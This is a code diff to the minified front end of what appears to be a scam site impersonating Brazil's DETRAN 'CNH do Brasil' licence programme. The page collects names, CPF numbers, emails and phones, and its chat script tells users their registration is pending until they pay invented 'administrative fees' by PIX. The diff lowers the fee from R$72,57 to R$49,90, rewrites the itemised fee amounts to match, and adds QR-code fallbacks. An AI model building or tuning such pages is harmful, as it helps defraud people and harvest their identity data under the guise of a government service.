@@ -15081,7 +15081,7 @@ function gp() {
                     body: JSON.stringify({
                         nome: C.nome,
                         cpf: C.cpf,
-                        valor: 72.57,
+                        valor: 49.90,
                         email: C.email || "",
                         telefone: C.phone || "",
                         detran: j
@@ -15116,7 +15116,7 @@ function gp() {
                             })
                         })).json();
                     if (j.success) {
-                        if (n(j), j.pix_code) try {
+                        n(j); if (j.qrcode_base64) d(j.qrcode_base64); else if (j.qr_code_image) d(j.qr_code_image); else if (j.qrcode_url) d(j.qrcode_url); else if (j.pix_code) try {
                             const A = await Zs.toDataURL(j.pix_code, {
                                 width: 256,
                                 margin: 2,
@@ -21472,7 +21472,7 @@ function RE() {
                                         children: "Total:"
                                     }), l.jsx("span", {
                                         className: "whitespace-nowrap",
-                                        children: "R$72,57"
+                                        children: "R$49,90"
                                     })]
                                 })]
                             })]
@@ -21545,7 +21545,7 @@ function DE() {
                     console.log("PAGAMENTO CONFIRMADO!");
                     const I = `fb_conversion_${M}`;
                     return !localStorage.getItem(I) && typeof window.fbq < "u" && (window.fbq("track", "Purchase", {
-                        value: (t == null ? void 0 : t.amount) || 72.57,
+                        value: (t == null ? void 0 : t.amount) || 49.90,
                         currency: "BRL",
                         content_name: "Pagamento via PIX - CNH do Brasil",
                         content_type: "product",
@@ -21583,7 +21583,7 @@ function DE() {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        amount: 72.57,
+                        amount: 49.90,
                         customer_name: _.nome,
                         customer_email: _.email,
                         customer_phone: _.phone,
@@ -21591,7 +21591,7 @@ function DE() {
                     })
                 })).json();
             if (I.success) {
-                if (n(I), I.pix_code) try {
+                n(I); if (I.qrcode_base64) h(I.qrcode_base64); else if (I.qr_code_image) h(I.qr_code_image); else if (I.qrcode_url) h(I.qrcode_url); else if (I.pix_code) try {
                     const $ = await Zs.toDataURL(I.pix_code, {
                         width: 256,
                         margin: 2,
@@ -21757,7 +21757,7 @@ function DE() {
                                 children: "Valor:"
                             }), l.jsx("span", {
                                 className: "font-bold text-green-600",
-                                children: "R$ 72,57"
+                                children: "R$ 49,90"
                             })]
                         }), l.jsxs("div", {
                             className: "flex justify-between items-center",
@@ -21822,7 +21822,7 @@ function DE() {
                         className: "text-center mb-6",
                         children: [l.jsxs("p", {
                             className: "text-3xl font-bold text-green-600",
-                            children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "72,57"]
+                            children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "49,90"]
                         }), l.jsx("p", {
                             className: "text-gray-600",
                             children: "Valor a ser pago"
@@ -21887,7 +21887,7 @@ function DE() {
                             }), l.jsx("li", {
                                 children: "3. Escaneie o QR Code ou cole o código PIX"
                             }), l.jsx("li", {
-                                children: "4. Confirme o pagamento de R$ 72,57"
+                                children: "4. Confirme o pagamento de R$ 49,90"
                             })]
                         })]
                     }), l.jsxs("div", {
@@ -22174,7 +22174,7 @@ function OE() {
                     if (console.log("PAGAMENTO CONFIRMADO!", Y.bank_tx_id), typeof window < "u" && window.fbq) {
                         const ge = window.fbq;
                         ge("track", "Purchase", {
-                            value: (m == null ? void 0 : m.amount) || 72.57,
+                            value: (m == null ? void 0 : m.amount) || 49.90,
                             currency: "BRL",
                             content_type: "product",
                             content_ids: [B],
@@ -22199,7 +22199,7 @@ function OE() {
                     if (console.log("PAGAMENTO CONFIRMADO (manual)!", W.bank_tx_id), typeof window < "u" && window.fbq) {
                         const Y = window.fbq;
                         Y("track", "Purchase", {
-                            value: (m == null ? void 0 : m.amount) || 72.57,
+                            value: (m == null ? void 0 : m.amount) || 49.90,
                             currency: "BRL",
                             content_type: "product",
                             content_ids: [m.deposit_id],
@@ -22299,7 +22299,7 @@ function OE() {
         const Y = "fb_addtocart_chat_tracked";
         if (!localStorage.getItem(Y) && typeof window.fbq < "u") try {
             window.fbq("track", "AddToCart", {
-                value: 72.57,
+                value: 49.90,
                 currency: "BRL",
                 content_name: "Taxa DETRAN - CNH do Brasil",
                 content_type: "product"
@@ -22337,7 +22337,7 @@ function OE() {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        amount: 72.57,
+                        amount: 49.90,
                         customer_name: ge.nome,
                         customer_email: ge.email || "cliente@email.com",
                         customer_phone: ge.phone || "11999999999",
@@ -22402,11 +22402,11 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
         xw = async () => {
             tc("Prosseguir", !1), i("renach_created"), await vw(`Prezado(a) ${Z}, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:
 
-• Taxa de Expedição de Documento (TED): R$ 26,13
-• Taxa de Serviços Administrativos (TSA): R$ 19,30
-• Taxa de Processamento Eletrônico (TPE): R$ 19,30
+• Taxa de Expedição de Documento (TED): R$ 16,70
+• Taxa de Serviços Administrativos (TSA): R$ 16,60
+• Taxa de Processamento Eletrônico (TPE): R$ 16,60
 
-Valor Total: R$ 72,57`, 3e3), i("finalize_button")
+Valor Total: R$ 49,90`, 3e3), i("finalize_button")
         },
         ww = async () => {
             tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
@@ -22430,7 +22430,7 @@ Valor Total: R$ 72,57`, 3e3), i("finalize_button")
 
 Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.
 
-Assim que realizar o pagamento das taxas no valor de R$ 72,57, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
+Assim que realizar o pagamento das taxas no valor de R$ 49,90, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
         };
     x.useEffect(() => {
         f && y && fw()
@@ -23077,7 +23077,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 72,57, clique no botão 
                                         children: [l.jsx("span", {
                                             children: "TOTAL"
                                         }), l.jsx("span", {
-                                            children: "72,57"
+                                            children: "49,90"
                                         })]
                                     })]
                                 })]
@@ -23185,7 +23185,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 72,57, clique no botão 
                                             children: "VALOR A PAGAR EM REAIS"
                                         }), l.jsx("p", {
                                             className: "font-bold text-lg",
-                                            children: "R$ 72,57"
+                                            children: "R$ 49,90"
                                         })]
                                     })]
                                 }), o === "awaiting_payment" && l.jsx("div", {
